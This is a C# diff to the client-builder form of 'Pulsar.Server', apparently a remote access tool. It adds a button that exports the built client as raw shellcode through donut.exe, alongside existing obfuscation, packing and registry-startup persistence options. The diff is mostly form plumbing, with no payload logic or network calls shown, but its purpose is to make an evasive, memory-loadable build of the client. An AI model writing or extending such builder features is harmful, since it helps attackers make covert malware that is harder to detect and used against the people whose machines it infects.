@@ -57,6 +57,7 @@ namespace Pulsar.Server.Forms
             
             checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
             UpdatePastebinUI();
+            btnShellcode.Enabled = File.Exists(Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "donut.exe"));
         }
         
         private void CheckBox1_CheckedChanged(object sender, EventArgs e)
@@ -427,7 +428,7 @@ namespace Pulsar.Server.Forms
                  (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
 
-        private BuildOptions GetBuildOptions()
+        private BuildOptions GetBuildOptions(bool isShellcode = false)
         {
             BuildOptions options = new BuildOptions();
             if (!CheckForEmptyInput() && !checkBox1.Checked)
@@ -520,9 +521,9 @@ namespace Pulsar.Server.Forms
             using (SaveFileDialog sfd = new SaveFileDialog())
             {
                 sfd.Title = "Save Client as";
-                sfd.Filter = "Executables *.exe|*.exe";
+                sfd.Filter = isShellcode ? "Shellcode Binary *.bin|*.bin" : "Executables *.exe|*.exe";
                 sfd.RestoreDirectory = true;
-                sfd.FileName = "Client-built.exe";
+                sfd.FileName = isShellcode ? "Client-built.bin" : "Client-built.exe";
                 if (sfd.ShowDialog() != DialogResult.OK)
                 {
                     throw new Exception("Please choose a valid output path.");
@@ -554,6 +555,25 @@ namespace Pulsar.Server.Forms
             SetBuildState(false);
 
             Thread t = new Thread(BuildClient);
+            t.Start(options);
+        }
+
+        private void btnShellcode_Click(object sender, EventArgs e)
+        {
+            BuildOptions options;
+            try
+            {
+                options = GetBuildOptions(true);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(this, ex.Message, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            SetBuildState(false);
+
+            Thread t = new Thread(BuildShellcode);
             t.Start(options);
         }
 
@@ -603,6 +623,47 @@ namespace Pulsar.Server.Forms
                     {
                         MessageBox.Show(this,
                             $"An error occurred!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}", "Build failed",
+                            MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    });
+                }
+                catch (Exception)
+                {
+                }
+            }
+            SetBuildState(true);
+        }
+
+        private void BuildShellcode(object o)
+        {
+            try
+            {
+                BuildOptions options = (BuildOptions)o;
+
+                var builder = new ClientBuilder(options, "client.bin");
+
+                builder.BuildShellcode(chkObfuscateOutput.Checked, chkPackOutput.Checked);
+
+                try
+                {
+                    this.Invoke((MethodInvoker)delegate
+                    {
+                        MessageBox.Show(this,
+                            $"Successfully built client shellcode! Saved to:\\{options.OutputPath}",
+                            "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    });
+                }
+                catch (Exception)
+                {
+                }
+            }
+            catch (Exception ex)
+            {
+                try
+                {
+                    this.Invoke((MethodInvoker)delegate
+                    {
+                        MessageBox.Show(this,
+                            $"An error occured!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}", "Build failed",
                             MessageBoxButtons.OK, MessageBoxIcon.Error);
                     });
                 }
